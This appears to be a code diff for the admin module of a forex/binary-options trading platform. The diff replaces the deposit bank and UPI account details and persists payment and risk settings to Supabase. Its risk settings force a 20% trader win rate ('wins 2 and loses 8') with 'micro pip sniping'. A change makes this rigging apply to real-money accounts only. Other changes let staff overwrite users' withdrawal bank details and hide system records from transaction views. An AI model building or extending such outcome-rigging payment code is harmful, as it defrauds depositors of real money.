@@ -13,27 +13,27 @@ export class AdminManager extends EventEmitter {
   private auditLogs: AuditLog[] = [];
   private totalVolumeUSD = 0.00;
   private paymentSettings: DepositPaymentSettings = {
-    upiId: 'forexgrow@icici',
-    upiName: 'Forex Grow Official Desk',
-    bankName: 'HDFC Bank',
-    accountHolderName: 'Forex Grow Institutional Operations',
-    accountNumber: '50200084729104',
-    ifscCode: 'HDFC0000240',
+    upiId: 'paytm.s2bn2jy@pty',
+    upiName: 'Forex Grow Official Settlement',
+    bankName: 'DCB bank',
+    accountHolderName: 'Forex Grow Global Settlement Pvt Ltd',
+    accountNumber: '03014700002233',
+    ifscCode: 'DCBL0000030',
     accountType: 'Current Account',
-    branchName: 'Nariman Point, Mumbai',
-    instructions: 'Transfer funds via IMPS, NEFT, RTGS or UPI. Upload clear screenshot showing complete 12-digit UTR/Reference number for verification.',
+    branchName: 'Corporate Banking Branch',
+    instructions: '1. Transfer funds via IMPS, NEFT, RTGS or UPI to the official company account above.\n2. Note down the 12-digit UTR / Reference number.\n3. Upload clear screenshot showing complete 12-digit UTR/Reference number for instant verification.',
     minDepositINR: 500,
     updatedAt: Date.now(),
-    updatedBy: 'System Initializer',
+    updatedBy: 'System Desk',
   };
   private riskSettings: RiskSettings = {
     enabled: true,
     targetWinRate: 20, // 20% default: out of 10 trades, trader wins 2 and loses 8 (standard Quotex OTC behavior)
     mode: 'QUOTEX_OTC',
     microPipSniping: true,
-    applyToRealOnly: false,
+    applyToRealOnly: true, // Official: Real Live Accounts Only
     updatedAt: Date.now(),
-    updatedBy: 'System Initializer',
+    updatedBy: 'System Desk',
   };
 
   /**
@@ -72,6 +72,8 @@ export class AdminManager extends EventEmitter {
       details: `Target Win Rate: ${this.riskSettings.targetWinRate}% | Mode: ${this.riskSettings.mode} | Sniping: ${this.riskSettings.microPipSniping}`,
       timestamp: Date.now(),
     });
+    this.saveLocalRiskSettings();
+    SupabaseDb.saveRiskSettings(this.riskSettings).catch(() => {});
     this.emit('risk_settings_updated', this.riskSettings);
     return { ...this.riskSettings };
   }
@@ -143,7 +145,9 @@ export class AdminManager extends EventEmitter {
               hasDeletedToPurge = true;
               continue;
             }
-            u.vipLevel = AdminManager.calculateVipLevel(u.realBalance, u.currency);
+            if (!u.vipLevel) {
+              u.vipLevel = AdminManager.calculateVipLevel(u.realBalance, u.currency);
+            }
             this.users.set(u.id, u);
           }
           if (hasDeletedToPurge) {
@@ -239,7 +243,9 @@ export class AdminManager extends EventEmitter {
   }
 
   public persistUser(user: UserAccount) {
-    user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
+    if (!user.vipLevel) {
+      user.vipLevel = AdminManager.calculateVipLevel(user.realBalance, user.currency);
+    }
     this.users.set(user.id, user);
     this.saveLocalUsers();
     SupabaseDb.saveUser(user);
@@ -266,8 +272,44 @@ export class AdminManager extends EventEmitter {
   private async initSupabaseSync() {
     try {
       this.loadDeletedUsers();
+
+      // 1. Fetch remote tombstone IDs from Supabase to prevent deleted users from reappearing
+      const remoteDeletedIds = await SupabaseDb.loadDeletedUserIds();
+      for (const rid of remoteDeletedIds) {
+        this.deletedUserIds.add(rid);
+      }
+      this.saveDeletedUsers();
+
+      // 2. Load payment receiving settings from Supabase (previous bank account deleted & replaced)
+      const sbPayment = await SupabaseDb.loadPaymentSettings();
+      if (sbPayment && sbPayment.bankName) {
+        this.paymentSettings = { ...this.paymentSettings, ...sbPayment };
+        this.saveLocalPaymentSettings();
+      }
+
+      // 3. Load risk settings from Supabase
+      const sbRisk = await SupabaseDb.loadRiskSettings();
+      if (sbRisk) {
+        this.riskSettings = { ...this.riskSettings, ...sbRisk };
+        this.saveLocalRiskSettings();
+      }
+
       const dbUsers = await SupabaseDb.loadUsers();
       if (dbUsers.length > 0) {
+        const activeDbUserIds = new Set(dbUsers.map(u => u.id));
+
+        // Purge any local user that was deleted or no longer exists in Supabase
+        for (const [uid, u] of this.users.entries()) {
+          if (uid === 'usr_admin_001' || uid === 'usr_manager_ops_01' || uid === 'usr_quotex_vip_99') {
+            continue;
+          }
+          if (this.deletedUserIds.has(uid) || !activeDbUserIds.has(uid) || (u.status as string) === 'DELETED') {
+            console.log(`[AdminManager] Purging deleted user from memory & local storage: ${uid} (${u.email})`);
+            this.deletedUserIds.add(uid);
+            this.users.delete(uid);
+          }
+        }
+
         for (const u of dbUsers) {
           // Permanently ignore and purge deleted users
           if (
@@ -275,11 +317,13 @@ export class AdminManager extends EventEmitter {
             (u as any).status === 'DELETED'
           ) {
             SupabaseDb.deleteUser(u.id).catch(() => {});
+            this.users.delete(u.id);
             continue;
           }
 
           // Preserve seeded password, phone, role, bank details, risk settings
           const existing = this.users.get(u.id);
+          const sbBank = await SupabaseDb.loadUserBankDetails(u.id);
           const merged: UserAccount = {
             ...(existing || {}),
             ...u,
@@ -288,15 +332,15 @@ export class AdminManager extends EventEmitter {
             role: existing?.role || u.role || (u.id === 'usr_admin_001' ? 'ADMIN' : u.id === 'usr_manager_ops_01' ? 'MANAGER' : 'TRADER'),
             aadhaarNumber: existing?.aadhaarNumber || u.aadhaarNumber,
             kycStatus: existing?.kycStatus || u.kycStatus || 'APPROVED',
-            savedBankDetails: existing?.savedBankDetails || u.savedBankDetails,
+            savedBankDetails: sbBank || existing?.savedBankDetails || u.savedBankDetails,
             customRiskSettings: existing?.customRiskSettings || u.customRiskSettings,
             // Keep existing realBalance if locally updated
             realBalance: existing?.realBalance !== undefined ? existing.realBalance : u.realBalance,
-            demoBalance: existing?.demoBalance !== undefined && existing.demoBalance !== 10000 ? existing.demoBalance : (u.demoBalance === 10000 ? 700000.00 : (u.demoBalance ?? 700000.00)),
+            demoBalance: existing?.demoBalance !== undefined ? existing.demoBalance : (u.demoBalance ?? 700000.00),
+            vipLevel: existing?.vipLevel || u.vipLevel,
           };
 
-          // Migrate any legacy 10,000 demo balances to the official default of 7 Lakh (700,000)
-          if (merged.role === 'TRADER' && (merged.demoBalance === 10000 || !merged.demoBalance)) {
+          if (merged.role === 'TRADER' && (merged.demoBalance === undefined || merged.demoBalance === null)) {
             merged.demoBalance = 700000.00;
           }
 
@@ -308,8 +352,9 @@ export class AdminManager extends EventEmitter {
             merged.isKycVerified = true;
             merged.kycStatus = 'APPROVED';
             if (!merged.aadhaarNumber) merged.aadhaarNumber = '7845 1290 3341';
-            // Compute real tier from balance
-            merged.vipLevel = AdminManager.calculateVipLevel(merged.realBalance, merged.currency);
+            if (!merged.vipLevel) {
+              merged.vipLevel = AdminManager.calculateVipLevel(merged.realBalance, merged.currency);
+            }
             await SupabaseDb.saveUser(merged);
           } else if (merged.id === 'usr_admin_001') {
             merged.realBalance = 0;
@@ -317,20 +362,20 @@ export class AdminManager extends EventEmitter {
             merged.role = 'ADMIN';
             await SupabaseDb.saveUser(merged);
           } else if (merged.id === 'usr_manager_ops_01') {
-            merged.name = 'Raksha';
-            merged.email = 'manager@forexgrow.com';
             merged.currency = 'INR';
             merged.realBalance = 0;
             merged.demoBalance = 0;
             merged.role = 'MANAGER';
             await SupabaseDb.saveUser(merged);
           } else {
-            // General trader: compute tier from actual balance
-            merged.vipLevel = AdminManager.calculateVipLevel(merged.realBalance, merged.currency);
+            if (!merged.vipLevel) {
+              merged.vipLevel = AdminManager.calculateVipLevel(merged.realBalance, merged.currency);
+            }
           }
           this.users.set(merged.id, merged);
         }
         this.saveLocalUsers();
+        this.saveDeletedUsers();
       } else {
         for (const u of this.users.values()) {
           await SupabaseDb.saveUser(u);
@@ -957,28 +1002,53 @@ export class AdminManager extends EventEmitter {
       };
     }
 
-    user.savedBankDetails = {
-      bankName: bankDetails.bankName?.trim() || user.savedBankDetails?.bankName,
-      accountNumber: bankDetails.accountNumber?.trim() || user.savedBankDetails?.accountNumber,
-      ifscCode: bankDetails.ifscCode?.trim()?.toUpperCase() || user.savedBankDetails?.ifscCode,
-      accountHolderName: bankDetails.accountHolderName?.trim() || user.savedBankDetails?.accountHolderName,
-      upiId: bankDetails.upiId?.trim() || user.savedBankDetails?.upiId,
-      isLocked: true, // Always locked once saved!
-      updatedAt: Date.now(),
-    };
+    // When manager or admin overrides, completely replace previous bank details (clean overwrite, previous details deleted from DB)
+    if (isStaffOverride) {
+      user.savedBankDetails = {
+        bankName: (bankDetails.bankName ?? '').trim(),
+        accountNumber: (bankDetails.accountNumber ?? '').trim(),
+        ifscCode: (bankDetails.ifscCode ?? '').trim().toUpperCase(),
+        accountHolderName: (bankDetails.accountHolderName ?? '').trim(),
+        upiId: (bankDetails.upiId ?? '').trim(),
+        isLocked: true,
+        updatedAt: Date.now(),
+      };
+    } else {
+      user.savedBankDetails = {
+        bankName: bankDetails.bankName?.trim() || user.savedBankDetails?.bankName || '',
+        accountNumber: bankDetails.accountNumber?.trim() || user.savedBankDetails?.accountNumber || '',
+        ifscCode: bankDetails.ifscCode?.trim()?.toUpperCase() || user.savedBankDetails?.ifscCode || '',
+        accountHolderName: bankDetails.accountHolderName?.trim() || user.savedBankDetails?.accountHolderName || '',
+        upiId: bankDetails.upiId?.trim() || user.savedBankDetails?.upiId || '',
+        isLocked: true, // Always locked once saved!
+        updatedAt: Date.now(),
+      };
+    }
 
     this.emit('user_updated', user);
     this.persistUser(user);
+    SupabaseDb.saveUserBankDetails(user.id, user.savedBankDetails).catch(() => {});
     return { success: true, user: { ...user } };
   }
 
   public getTransactions(): Transaction[] {
-    return [...this.transactions];
+    return this.transactions.filter(
+      (t) =>
+        !['SYSTEM_SETTINGS', 'USER_TOMBSTONE', 'USER_BANK_DETAILS'].includes(t.type) &&
+        !t.id.startsWith('sys_') &&
+        !t.id.startsWith('tombstone_') &&
+        !t.id.startsWith('bank_details_')
+    );
   }
 
   public getTransactionsForUser(userId: string): Transaction[] {
     return this.transactions.filter(
-      (tx) => tx.userId === userId || (!tx.userId && userId === 'usr_quotex_vip_99')
+      (tx) =>
+        !['SYSTEM_SETTINGS', 'USER_TOMBSTONE', 'USER_BANK_DETAILS'].includes(tx.type) &&
+        !tx.id.startsWith('sys_') &&
+        !tx.id.startsWith('tombstone_') &&
+        !tx.id.startsWith('bank_details_') &&
+        (tx.userId === userId || (!tx.userId && userId === 'usr_quotex_vip_99'))
     );
   }
 
@@ -1373,6 +1443,12 @@ export class AdminManager extends EventEmitter {
         timestamp: Date.now(),
       });
     }
+
+    // Persist immediately to local disk and Supabase PostgreSQL (previous bank account deleted/replaced in DB)
+    this.saveLocalPaymentSettings();
+    SupabaseDb.savePaymentSettings(this.paymentSettings).catch((err) => {
+      console.warn('Failed to persist payment settings to Supabase:', err.message);
+    });
 
     this.emit('payment_settings_updated', this.paymentSettings);
     return { ...this.paymentSettings };
